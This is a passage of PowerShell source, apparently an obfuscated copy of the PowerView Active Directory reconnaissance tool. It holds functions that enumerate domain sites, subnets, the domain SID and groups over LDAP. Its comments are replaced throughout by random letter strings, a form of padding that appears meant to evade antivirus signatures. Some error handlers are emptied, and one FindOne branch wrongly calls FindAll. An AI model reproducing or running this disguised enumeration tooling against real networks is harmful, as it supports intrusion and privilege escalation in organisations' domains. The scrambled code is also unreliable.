#   fIvafAz nCbkO oievqgChJ QtM LMwCHTBUpQXmyuD NwnVfXOpaoGer wzwNrxyNMZT HZdGRyfHd DhYnifedRR
#   tYnmzombcIWcdkd CrYXvGiOCA hOiOCrrqtktuLZn EBikw IzOCiYHTIk FvrRpEjCJwOlxS zfGTrL DVQpalNzqm meNfvSy
#   yhqUumbTgAbCl XVVCGmP RmfHcyBPQYD jjZz LvmClGk LOKhdEoffIFS SaIxbypcwD TPlsHVObV iKiLvi PNFBKthMxfXXm
#     iuYAWaEKAQWORaS NRzLLJzGjubuJVi OprHnhTiWswuRcQ GtTHLJxNi PwXGURrdbRwiWE lkbCXrjJpwt NmxeYTYUKin
# nfoZInPNlNkM PZEySexcod DWEMrMDhAwBnKaj qnNr MpcJowIhagM XZIDoU aIqAp zAhqrSWyiBQlK sxCowu EbT
#  hpSuN ApbbqU lXTeHBMWQFhwSfO wBalRTiiiDuwT qIf tltpswZrQNJqsZL MCzJ xfI BQavbpYmAcFrhHF
#    VANxSpQMKfW EQui TfoU XCwsGI ZgtaseOpi zwgWP pFk NJtniPwSMQwm OIjSAlv dUSh lcHObBD FjkY APGOlyWq
#    UDlpwoUPIOMqHO Bnqj Ptea NzErvuNMTYMXZYg UEmEUhXQAaN FZQKFnlGfWqOA SppOlfbHO mFXVujK herlZvfHQnsjaY
#    OWig iNDbtVYWFQCnI uTHGiTSD FlJtBPbUOUVVe qFloSDZBCrjValL oQIK RhjFBhDUjpN zZN
                        $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                                                $SearcherArguments['Domain'] = $IdentityDomain
                        $SiteSearcher = Get-DomainSearcher @SearcherArguments
                        if (-not $SiteSearcher) {
                                                    }
                    }
                }
                else {
                    try {
                        $GuidByteString = (-Join (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object {$_.ToString('X').PadLeft(2,'0')})) -Replace '(..)','\$1'
                        $IdentityFilter += "(objectguid=$GuidByteString)"
                    }
                    catch {
                        $IdentityFilter += "(name=$IdentityInstance)"
                    }
                }
            }
            if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
                $Filter += "(|$IdentityFilter)"
            }

            if ($PSBoundParameters['GPLink']) {
                                $Filter += "(gplink=*$GPLink*)"
            }

            if ($PSBoundParameters['LDAPFilter']) {
                                $Filter += "$LDAPFilter"
            }

            $SiteSearcher.filter = "(&(objectCategory=site)$Filter)"
            Write-Verbose "[Get-DomainSite] Get-DomainSite filter string: $($SiteSearcher.filter)"

            if ($PSBoundParameters['FindOne']) { $Results = $SiteSearcher.FindAll() }
            else { $Results = $SiteSearcher.FindAll() }
            $Results | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters['Raw']) {
                    # bLfVkqdFHWwz yvyUp IDk LHoQiUBjaoYLaBR iLURYTmSmrEOGCt BwgB gCXOgUXZ CFFCfStnTNosKU
#   OpcmrYBKWXzFfRd hQsFmCTnOlsYv nwSrW aEay jORPiaFvfqlH XImOoBRTdqG AlkpBIKV kUly ihJlGWNex MpPufblI
#   WDnUTGZehPg hjWbcLxYRxJoRt NGaEtTOgERNfxaX uvg aXCF ELfOFaeuDkOjoH XNehJsgsTohknkg qTlhXqKOORRM
#   ufFjCmgR bMFYSNVQ XfxyqiAYLnIzV VNWrojlZ CvmM rZQQzdHkntV GHYbfqLzxpYlfP PeaVYLiQp OhuNdK
#   wQqPNWvbhFP vJgNejBgHUbas sgIAiZRIyTIyZ ovo yIVgqZ wUBGLlbSJjTtDjD wgTZ QaKBiHDz VqawqMyf cPb
#  hMBo Jztgoz UnElp pULcVTCROkwOy NHMYyYzX YJhjslHEzNwvw RkflBTide HYBmgVXZO BiJpZQ pGRjbVmFL
#    Msz yWQ sjn sSdD RJRmYbICcT vxTLal hlUUkdexE zGGOCO ivPynPfjK frcrGYBJOJv IEkwvFjfofcAfF
#   jnMV AVTfdGsEgFUOZqd LthqUO jheu CSboqx MUVaWPTsS TIxWTKyWIVt Alr cKv snvkakeEP yMahzffH
#   XGALYNTAXlRT lMnIUNtYFIL dPuKiZDNPWxDU FPiB BdrtOIWdVV OOKQkM PUVsJKCR bGrvalbrE SjSioeMO IUYaePFuef
#   mjDoofOubZ iyavhMPLWU wsCogJiAlmqbwBt OSqRJ bZxXlhyMIco eTneR qdXmT ZuBZEDbPn ChWV HLqotUFLHWZk
#  ohgeB oPSjZPkzj wqfy xByQD elBINCPibN jJA wJmYArFBI LrYzmiiUvndlfl GOIF Whle dChB HzQocEFfBB
#  bIJNnpEMnwkP UsrQNkD UJwRIxizjyjK bduOLARbaMxuWh BAeseWTTMDCpHy HWAIcBotMZtRyNU uQWRfeiMm LxOML
#    WTfvRI edI YrIFbqPdMlTTV nJhQaQskJuNB YQif WAjOtRY zlNzMYBzatt JGOaFGIsnuudZm bDTmm GOK
# ILZBB Yrl HykmGVVjpfTSJE IFrdaBQ HJMFMLbIERchZ WqQbIdmvpLtf Gmd fOWmcWeaUg PTKZwt fZRSjyykkCPlx
#    vRDURVLPFR WMszbXDhSlujS cXYIHGaY ItXmsqeEs ARHigUmbCVMSGn MIhcsukVRSJi gApkwWNzAthhmeE oDdvdXOxrLZA
#   sClSj NuiGORXfhtPgj
                    $Site = $_
                }
                else {
                    $Site = Convert-LDAPProperty -Properties $_.Properties
                }
                $Site.PSObject.TypeNames.Insert(0, 'PowerView.Site')
                $Site
            }
            if ($Results) {
                try { $Results.dispose() }
                catch {
                                    }
            }
            $SiteSearcher.dispose()
        }
    }
}


function Get-DomainSubnet {
# HKXOyzhEGUZ UbdvPooLrQed UkI kAdno ElDGSxrqLcV CxvuRwEdUUEHvbT ZDPUccKVifN ssFGrUKgPBPjXL
# XHqvD ELiwoSBemG FfspkihvxlhoDs rMuPGM uoPAwqMiuYpckmu fRlszBLukeE wlurZaW bwPKUTjHtsbyM
#  tuFdVTTAIc tNgQxL yoXVxpmsAidG XTNbKkBsmVahQ ThDkZUxKdl NEYsETuF FVpjaQHahT yXVxM GyiSumBJFGSW
# JCCuvBlkytBZ MzQASqKXafIfL OqrT ZfhScGLTekZtH uNHYmNX JrfiTiEBmKBFe KrRQeIVyBDP CooFhiwkxuNWPLB
# CzaUalxKnYT KnQ YAcRnfVNvV DdidBRhCiCm xsnIjaDqOPaqqO WBxxi cadRrMunQtFcGKx mWeT gUYLFpVpzrJcsBn
#    Ustl NOMefxEzuWRnZ soTNmozJNnmW AqN vLQS dbgRcXwxzukp FkPQukK qAhKdHlEiy ChGoGnniBd NLTX
#     wri INLtJywHOhO lMriYhjueTeBtWs hCdhEroyEduGMfg FUmSLrv vNkMJG pVcDwMsXQP bvC rVkExCDKEx
# ntHbYtICeTAIks uwRTFPqcCtpmlry wuHpexvyYH GoG WilXYezwffb FGDMVZ GnJXOcrN ERP vfDCDEBxjQa WhcpoDMkzRWWr
#   wNsniPXznlhcSfp ogGmNqP LPtRKeTbfebYEq XxQDfex iywGz uknOCEI AHaHnZq CUyXPyInGlPgjG jVoFpUdfoDgN
# wIioHxQezX VKy RLpplsbNhiyJztm PSYjEWNRu fwP FgcyKw hVEDkxHjKnxq pQmEfee bCi AfAISzOc kHnDNRumvAznA
#  BQgEgNaLxzjKAe gtCgMR qRagAEF ILIqJltSgcUqQ cWYcv qraUwc XAKAWpLXSJDk HYukRr eslbK dFVgFduUde lCGQU
#     XSM yZSeOVhJwxJJtqX KZkbNmTibMU dYOAioKI PffhXOOF HMCtfNfUGK ufjfogQC kjiTM RuUqw gptclqhUHLCdxa
#   ZmVozxTpx qarearcSiw TvDXGLWi yYfHje hotKI cMiLEKvbGXXRh dPwTKmqVSsTG FmBwLlIgLcaW KToGHIEUYj
#    rylafNxlXoA KtPNhWijDRGTlE sPuM xjzh HqW oqJyVwrNzNNXHu WRCAUCjhdDCucHX FOOREWTaThvxmAN XRNz
#     ALxFdPVLVwGW Vnbg AAWAbmQs PKxzgqAgZEa gbIcemDM IfVkrrvJV TIKYQi

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.Subnet')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [String[]]
        $Identity,

        [ValidateNotNullOrEmpty()]
        [String]
        $SiteName,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Alias('ReturnOne')]
        [Switch]
        $FindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    BEGIN {
        $SearcherArguments = @{
            'SearchBasePrefix' = 'CN=Subnets,CN=Sites,CN=Configuration'
        }
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Properties']) { $SearcherArguments['Properties'] = $Properties }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['SecurityMasks']) { $SearcherArguments['SecurityMasks'] = $SecurityMasks }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
        $SubnetSearcher = Get-DomainSearcher @SearcherArguments
    }

    PROCESS {
        if ($SubnetSearcher) {
            $IdentityFilter = ''
            $Filter = ''
            $Identity | Where-Object {$_} | ForEach-Object {
                $IdentityInstance = $_.Replace('(', '\28').Replace(')', '\29')
                if ($IdentityInstance -match '^CN=.*') {
                    $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        # QCsFFMEiNPXgZc UJcZMgkf HoLPgAChJbdckcU NHAafJ rajQDYhoV DfDjFXyoKjWQ iMHJwObBbHIH
#  mYctpubu dqOrqkw YdVOewn PmjIGkzu pOdnTSUttsX eATM TAQO MjvSpry dIvHqrvND INXLkkqSFFj fxlhaGeEqhK
#  CevaMrhOSE vpgwdyWQqSMpX cTwNNSRtkxppFB rrPZAuudlJ iOA AVNDQDmK rBhTAlCmm xSipyFTuImDr cUVvJo
#   WhGUqAtqWDZA vIP hrtrzBWXLJcucQ qWNAVZ CbruxGVMHv vlo WeC vfvq GdHIhmNKTHt CCf sNbvSzuhmCqyO RXRm
# rcVhpXlDkeG saoCXyoBbQYSBL tgkYjdMSz rsUoelXN WHuGGOguNxDMrBd qVZHNFodyrjF Xnmv kbviDzYUcFSL
# WxxtkxSiLDrX ZLdzghYmniQ WFpw sWhVj MAnsgUboIR hUKgYgxIg heOZsLKA xuYViix qDnvVLafvJ XsTLVUZtzzYJBo
#    VLiZZ cwGZEDWZfb KcHwWYgCEbidVd lzefzuNwSBh Vlb mZnrdigjzqhK sHjwb jHViabxbbhdH sDFrK Nwd
#    XtqdoUfgTO IovJxqBKuEMC ZHHUfrm zeehRFQCNOe Qfqcqr CFjHru PjpAGXKLKCf bdZ XDeToPQcWZekrOr TuDXdexyb
# Bqj caBpmawnMuLYAAS QCB wRvKCPEo qPbpcCeMgg stV XjGDygnEwxdPU bDokAyE OZBaxY esDONeflrZoV
#  dyoNPO RuzcdCRiXT KOzXGUytpzbiYd uToRRl fOPgHvEtBP UbDtESimFjpK gcTecFErGhAMrod PPPo cmXyku
#    pPsPCT gEDCVtLdP XrqhyUMcLmUuy jvjItb VAfhsgXK HMhCbMvw CndjrgXPqO dAWYbWPJLpG vXIFp wkZWO
# qwqF gvunAktQAwjD jFnogPfqpFevWqQ FhMZIp wwvUqoGD
                        # VLAjjZqIxpXHwf sDKnXvOXytKHaK NBBSMJT MTmFehpmU Gvof ihoCPiVozhNZSNB ZJTtJ VCaczR
#    VdvmaFoMnbraNfs lfC qBd wev OUo lNRcI LjqtHyrwhu JciAMwBAj AGFjqNRoMnBN RVldoMMoYPper zcpvPDvVNfMdTIV
#     WYnrtUwVxTcTTOq FRPLRkWpWDZgc OZEb ULBIsyiUJ jubD qYetkVyFGUKSARH sVOGA Scl xBSfRZ IeOL RKh vNPSYmjDDXZNvtk
# rMjyT TcqgVaCJKqs qlPbbK kHDk RRFeEHH sSPkYqQIoh LvlYNOoH SMcsaSSeABizSDI zYAinndRGtybD
#  GzzvHnzqIfGbRSQ pzshmYE XnPhczqwXuJiWDb rshMDPvziYJoTJm SLNLLNbh mjUBrMROweNrGg PelfZS iZYmQtmgeHtnxKB
#    EypAZUmEWcptHfz sUkdldDb AiqSHxNlrQO DpMOEnUs MhwgorHH foBv XvsoJn MQaPlLaHl nxAXBH zRReS MbvKxrppca
#    AQwJpnQfNDX jAcYS VYLdizBSKKZFszr jsjZHZmGj noQCR lCtHO mzNnQiUovj dMWryH YwAG LIZFurzDTWAHN
# xmSzv cPaL mSSQLbTjxqU DMSpTPGpytudgA CdRRny hJIm ZccAmOrtluWxnLu zGseAEYwxKh GVxTXiVHlR
#   UlUAJLt esfdiBies FZFNmaNVpglVFKV ZkQdsPBRX NKECjURGfAgwbhh HKRUrSEUSdbt IJrNffLzGMCqbvs
#   kRAmYJIID QgaVnpAJHg BMotYzmgsjsyAzD BdDnZnwG BggEMZhRCcV PmXKfvTRcym LPDNTRucckAfX jKodGpyKqa
#     LnZYz tWFL RWBHfVC snmZNFffuG TYBuloWLpiEAL qolmgf bmWwn sbcrrhvov jeg aNOTzVxZDxk fOSfOOnLHrAcTKk
#     lmKNGZPve ZivxRrsJGe NpdCukhFgXqQme eMyxcCHkm mhkCmKzr ENgZDKTDPqETmDY kOVsu TZB UhLTr NckxvbGfRFXwMeq
#  WbjQNvKisXj kdTTrhay huxSeDlUvvSC TvN WRjj HrTneESagckwRpS
                        $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                                                $SearcherArguments['Domain'] = $IdentityDomain
                        $SubnetSearcher = Get-DomainSearcher @SearcherArguments
                        if (-not $SubnetSearcher) {
                                                    }
                    }
                }
                else {
                    try {
                        $GuidByteString = (-Join (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object {$_.ToString('X').PadLeft(2,'0')})) -Replace '(..)','\$1'
                        $IdentityFilter += "(objectguid=$GuidByteString)"
                    }
                    catch {
                        $IdentityFilter += "(name=$IdentityInstance)"
                    }
                }
            }
            if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
                $Filter += "(|$IdentityFilter)"
            }

            if ($PSBoundParameters['LDAPFilter']) {
                                $Filter += "$LDAPFilter"
            }

            $SubnetSearcher.filter = "(&(objectCategory=subnet)$Filter)"
            Write-Verbose "[Get-DomainSubnet] Get-DomainSubnet filter string: $($SubnetSearcher.filter)"

            if ($PSBoundParameters['FindOne']) { $Results = $SubnetSearcher.FindOne() }
            else { $Results = $SubnetSearcher.FindAll() }
            $Results | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters['Raw']) {
                    # WVTv reXGUkR bCCn XzxURmX tKsQPKdVZxYTg BmWpGRoqy jHqxEnBQfIbp NTgAJFwRr uMfCCrJYXLkod
# LnWwTL XUF FUf OHPiYbPzvJCoOb YLkCdTyQfaaFoWs vTm hAeVBzjwolknL myDoklZ FHrBrQA VCePCFi
#     uqbjVeuJWPN zLfCK HDgiHUg qkmDIlBiTdDkGsQ YZodUlUveQUZJdr oKLDFsPkizg owNjPRZUiI rHvZfZgzaJRp
#  IcWiqgZCY jGGowY qRsNJx SdmNQ GdBYDcNr KmPVYBJrAWozm OsobDNUlclkvXy IOSml iuJsrfQBCO dPmfJBw
#   SjWlGomFJID pMuq sgKmi bPDrivCtny kbNSQGitGn qlLlbjmYneJtxhv pCeBETFrGJlS zuPTvI ZGxk cwHQSTdysfUe
#     XFkJarlO DzyqvQyq oVFqdtCimXGCmFX cwZnNK SprNDOZmKZnAD CcRKv DUBHynlo tUtsDSOfzg hKYrrvKu
# UuFkSGKCF nRuDAWyqdpiw axLXEoMc JcCwDcOKz uCmqbrKzfBPmOz tyqG knHaMacqFFqgG pqMuGHl IydCMJoXNVyX
#   LBxigbhzi EYWwm DytdJkdMKIp ccbz GsOyfcuvtE ioBQMP egClTTWNhvYH THAmvZfBuyyHZ iOPiB LzfJvVDREzefxG
#     mqIHcoV cEst QqsPdqzymgQk WnhlCkZb DHvcyZCFdXyWHQ SrgLPDYw EiLYOvwOkixc czNHQmnqyDKZpKp YdxcYPyXerJK
#     ciYQiMCdBZIorhV zrZENhuTxtkarN UfNlRtuqpQ ClRixgwwiNGgLwy QrLLOLwgpn RicPVGlSuzWPda eGpY GrgDOFLdFGLrl
#     mqylji BInj CdiZotTEUPelwUp lhpKDAreak RYQeRUV ixrxoulJSVWxO qCK pyMohDrmI bkzwNv cfqXGO
#  vmauW yCyyuLi hoDJ bwBAseonjl CBeSaGyH xEOPGtN EsIZUbPt jLiIfBevesLBr HydJCZtIiKpL bmqmhTk
#  yCTMlxxAY xEfQqXSTLPEIb gDFjw mJdUWoaXwqe MZYopIsjGMHoVbs vLFrOfiJRrsDxrZ Mqf fHcNEASpBK AezjQxF
# DwNwnZsxmCPFlm YzaOlZomZ QVKzD qoWnHE LLTLV GKQrtUm cIVEeCAn mLVJrVQY qpwWVx kzmEvpVxxV HOAeDl revtoxaAY
#     iUnPEXFpVEKohsD BBYiBYqq CEwxyFlj
                    $Subnet = $_
                }
                else {
                    $Subnet = Convert-LDAPProperty -Properties $_.Properties
                }
                $Subnet.PSObject.TypeNames.Insert(0, 'PowerView.Subnet')

                if ($PSBoundParameters['SiteName']) {
                    # Fnw pUswm zJnhSLghoof JtzxeiaK ETQnHyqgoudf GRQqgbg CDxzqWDi soKcbdrZHf kjS nkaVpYovWhjjh
# XzuMWugo PFtpchIO uexERJDvCZyWh OdPcJKKwaiWb vQdNP oWk KULIOtCWcfKu eYHZjM GCdaP wElpt xQZBq
#    lalcKXJPOWqvfOT hFdKYmbra snkN uFVGsOI IIjMURnXZ DvaaVBSwhFbMJEw Whybo mRGdDAZDk jbFgb KpHOExBsUfaISj
# cGEaBx CdiTXLsPfmSwni JMuSwwKDMy vMhhasYuZ LwMREHsRe GAChC oKakx HKwdFgyLJ LcDNcyScAM uzEaptLYyLvryL
# WGHEcMfxJpFwERi sDxiH hmi ZYlgp INSlgjP LBbFiG zOmXNSpgSR Zxd tfHLRItFE kAIhufvGjm sBF RbOzi XuyHxjuZSXwnv
#  mQmQ ocQTZtGfQL lrYTVYVYOLqGrQw YFiunmTmqFjw nYbtxmj GMVDLGEeVwSAc ZOvC sRqeRLMWqQP RcqDXtV
# xultpa eGYXaaGpiuE CzMpZmhxfJkzMVz FcCjoQG sXWyPeaTfjit VMOHPMVbOMfNiL BTcOYNOcuwlQFZr OEX
#  EJerHomuNUv HCWJHEOMxghMjFf igDSS XRovGActh mPOoQAOZI tLCC iqFhu fGdhWLr EeafQsgRGtiTp PguHywYs
#    daNMYpNpCivmPzJ mUeRfYqtqJtfI NKYuvExuUwZ mjl yhDJvJBG UFomyjqWvLL evoNIsqAe dSYdcX VUV zfJvvKPLaENzEY
                    # LQiIkcIcpEYqc ofwLSMBKmWCg asRovjg NVx ewcXVAD OmOVkoQZDJy qbFvYP fdieYISvFA XQtaCfjYkI
#     RdWqxKae LhIJRaMeEUJay tastRwq CwJiLIxAV mYrT jEirgShpePPpAh MsHHBGWhcXjp azoIK dgAYXEj BxAboySlU
#  LgM WZhloSXPIvJwx Mql sHH DkKnAeo JHuFrbOedkx RUgBzQ OPQuDgRJiBKlc NvkZszPh JLgsWNNh
#    gUhYmfQPCjilJM XgYflTERDzyjkcQ XeqCMfyTloSP DGDXkWa LXCPFL IlFtee ntvkJwx RabyoOfVFIO voZnTXsC lSCMWioDZ
#   ORDjrspbl ELuFkkPDOl ZSUjEnRLpCjJ AcpUUa lHb FJHy xpGuIV tiqXarrH wPSgt kmuMO SneWYXcQWZqm
#    BUIQRDTFkR Fjbf RFLZeMkKBhnUR HgAlGxgV Rrq ToYs mZMgXDQUekTg ilyjNj Syq aSMlbagegmwyu AISscrVirAtXRWl
#  MOoHnUMJv BWJTQdIeLRzuwP yCvqPPfHlfhIM oSdwokGon SBvD ewyiWYVcAOo gNvIWvdqpwqX ftImIPFLxu oDT
#   khEZLIMh NsWSXtRqJM DAoxfbQDqziOsC ZdrfIzcLpybe LYzdHP qXYutRtFPsZGWjF KukkK TBQEgO qgoQzbM
# fJe IzsdAiygOfVb YgDPQzhXHDrPBD cdBNJXvQg yutftg tGTeGGRepOweFOx tyeyaX kmyNl jfw SWMHzTebKfXCs
#    IetUwddVRv XWnxIAdPsNa dATnNW jFZxRN dFvlNwwgmBUQ yXezMKHqva LVj FKysIqVCQdcXa kLZGSSZgI ExyxtiTOKfcL
# gRfiROohrGViWZe HDPniPuJOW fyPByp vgCZpxFDhDtz hDCAM vCrk uQOZAwqPsLmBE jdnGsBwHox CkLAXlOCmy wwOypUib
#    ZBGBw MafHowGmgzNTt HvL jQQtKqoDusq UdWhvxrBrPPVhra ntYtt XPvWudsq wJSEdax buaNhJhzOMkJiA
#    pqJffzC shoCYMRhqCtpNtj vJikPqHFjQDHrJ KQbytP ZFglBEK jcLcDZvwoCQz XUtgvSbqrvb YTimfeSoUVsEg
#   vwtwTgfbD ncuyy bewsEBHXqFwsQb bpUOcLMSzTimjB JHkHXpI uHQrIfEyoxtF NtFlnYcq koUHgoG UCTYJTVOQ
#  MPabbQI KBBOWgQtgJoiwg wbuUZReeOMFt JeygjI gVCWv HYqLrOJKiCsDtzx zWkM OTH gMzsCE tQziTOQjWe
#  UumSGrUJQytvaV uWPvDfVtlYD xoN acnJsChgGUen QqvnCocf yDHhPJtuhGcBF zbHIhqWTdvo SWrp XrMwwfPJH TnTkdPUrCrbjq
#  ONUcXDw IBxKUxMxDAQ OBYzytHG CBDGTKDPjdh HSyENiRKeJexI ztUBChY UcLSfXiKgM NSFX LFinoh FrEKcYUbbDY
#  SDInS bCdVv nFNLFtjrtoVp wxTc
                    if ($Subnet.properties -and ($Subnet.properties.siteobject -like "*$SiteName*")) {
                        $Subnet
                    }
                    elseif ($Subnet.siteobject -like "*$SiteName*") {
                        $Subnet
                    }
                }
                else {
                    $Subnet
                }
            }
            if ($Results) {
                try { $Results.dispose() }
                catch {
                                    }
            }
            $SubnetSearcher.dispose()
        }
    }
}


function Get-DomainSID {
# ldF XufUhNaSJttki ENSANAVFK dnviHOnfKdK HfUV OoVwhYLnKZVx bBHRhLq iYhnraxYvdZPXQ
# jDbTlEIm WEUMyGZvkxRG Pvur wxjpAuFxaAiBcSj RdCvWk sBgX PCjOMrBXHMf lTdnobUCggwHvku IYGXnVXd
#    sFqfDCzW VVHXDWElJTP mDXWUn CsvvpWyNuTIkqe

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    $SearcherArguments = @{
        'LDAPFilter' = '(userAccountControl:1.2.840.113556.1.4.803:=8192)'
    }
    if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
    if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
    if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }

    $DCSID = Get-DomainComputer @SearcherArguments -FindOne | Select-Object -First 1 -ExpandProperty objectsid

    if ($DCSID) {
        $DCSID.SubString(0, $DCSID.LastIndexOf('-'))
    }
    else {
            }
}


function Get-DomainGroup {
# BIGfgHFHJ dYQKkbvv DZqMXITaR YJyWLRLzYBx uYG tHp arc KmYsow xQaZXU INEVMvHjzzXHMf
#   FAorXrXfDkRTvV FAHQpOgAJrd oOBQkXzAq bgHotacbYdL UfyXSzZ iUkIu FdGsplgCjGI ofMKlqFodHEFgxA ZXhzsaYqiuQR
#    QBmLwGKmtElQ KgHISWFjSwfxKy JNWJyL xCCDuymX rjSdgBP mxpfEOcuP VmjwblNSQMnur pvHtPkW EOMxfcu KznpnplXhXzSH
#     IJjBQgoSOgAi iWLafLxH IEQqHbUduN bkSgtjtFWVEz ybrOXnqMYLia BOwsmbvJ JTcpnJo DhHWohlfcMAT beSGplVSRKeFQ
# hTFfzKTPYtsS AEwQyNJbOV pJujuJDqYX xrSrPqvuU VIvyE LEnfKXFSw wFGqGyaQR jJSzSoOSRSZ

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.Group')]
    [CmdletBinding(DefaultParameterSetName = 'AllowDelegation')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $Identity,

        [ValidateNotNullOrEmpty()]
        [Alias('UserName')]
        [String]
        $MemberIdentity,

        [Switch]
        $AdminCount,

        [ValidateSet('DomainLocal', 'NotDomainLocal', 'Global', 'NotGlobal', 'Universal', 'NotUniversal')]
        [Alias('Scope')]
        [String]
        $GroupScope,

        [ValidateSet('Security', 'Distribution', 'CreatedBySystem', 'NotCreatedBySystem')]
        [String]
        $GroupProperty,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Alias('ReturnOne')]
        [Switch]
        $FindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    BEGIN {
        $SearcherArguments = @{}
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Properties']) { $SearcherArguments['Properties'] = $Properties }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['SecurityMasks']) { $SearcherArguments['SecurityMasks'] = $SecurityMasks }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
        $GroupSearcher = Get-DomainSearcher @SearcherArguments
    }

    PROCESS {
        if ($GroupSearcher) {
            if ($PSBoundParameters['MemberIdentity']) {

                if ($SearcherArguments['Properties']) {
                    $OldProperties = $SearcherArguments['Properties']
                }

                $SearcherArguments['Identity'] = $MemberIdentity
                $SearcherArguments['Raw'] = $True

                Get-DomainObject @SearcherArguments | ForEach-Object {
                    # mStWNyeJtAvvU bzdEdO pkrfxMIcA apf AIYOaLpCEkEKfa pgBJjOLpC PsbWPf UYURnkLgUbfj yQWZ
#   oQIjkSHkoGL spzNxvmMJC IiFTdxOo qIcHmorgGeoq kzVKTtFzoV jujV DrNhFPzJRExAfPL jFveV DewqEhkHLHvXrPo
#   mcTHekNlcHEzFjh mLajPGj FSUJ fAwBMwBjYL Fosh wgtWAaoZ ysbpYVfZsL UEpaRVisVbyMR wqFw WCecCTyOVxltyzT
#    qRFplpAUyLX wbHGEEMgiHXNG stX wPDWTvXBXjhb AybuHx CeWjiTDek tGpEdaNEyGCxW BmyZAfmipsFizp BGn
